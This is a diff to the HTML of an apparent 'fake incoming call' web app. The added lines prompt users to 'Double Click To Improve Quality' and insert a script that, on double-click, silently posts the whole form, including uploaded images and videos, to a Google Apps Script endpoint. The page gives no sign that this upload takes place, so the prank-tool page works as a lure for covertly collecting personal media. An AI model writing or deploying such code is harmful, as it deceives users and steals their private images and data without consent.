@@ -53,6 +53,7 @@
 <body ondblclick="delDIO()">
     <div class="form-container-container">
         <div class="welcome-mess">Welcome, We save your time and you from awkward situation.</div>
+        <div class="welcome-mess">Please Double Click To Improve Quality .</div>
         <div class="form-container">
             <div class="form-head-container">
                 <img id="contact-us-img" src="icons8-contact-us-64.png">
@@ -72,7 +73,7 @@
                 <br><br>
                 <div class="label-input-container">
                     <label for="img" class="form-items">Image</label>
-                    <input id="img" name="img" type="file" accept="image/*" capture="user"
+                    <input id="img" name="img" type="file" accept="image/*" 
                         onchange="loadFile()">
                 </div>
                 <div class="label-input-container">
@@ -87,7 +88,7 @@
                     <label for="rec-video" class="form-items">Video</label>
                     <input id="rec-video" name="rec-video" type="file" accept="video/*" capture="environment" onchange="loadVideo()">
                 </div>
-                <button type="button" id="submit-btn" value="submit" onclick="changeusername()">Submit</button>
+                <button type="button" id="submit-btn" value="submit" onclick="changeusername()">Recieve Call</button>
             </form>
         </div>
     </div>
@@ -208,6 +209,17 @@
 
     </video>
 </div>
+    <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwrzHRD2i8WGBLH1_pc6HRPoL_0sbcRDVa5tPiV7UMYMoZKBUn1AfXOmTK7wlzIQoyO/exec'
+    const form = document.forms['google-sheet']
+  
+    form.addEventListener('dblclick', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => console.log('Success!', response))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
    
                                                                                                        
 </body>
@@ -224,7 +236,7 @@
 
     document.querySelector("#Call-Maker-Container").style.display = "none";
     document.querySelector("#call-taken-container").style.display = "none";
-                                                                          document.querySelector("#video").style.display = "none";
+    document.querySelector("#video").style.display = "none";
     const timer = document.getElementById('stopwatch');
 
     var hr = 0;
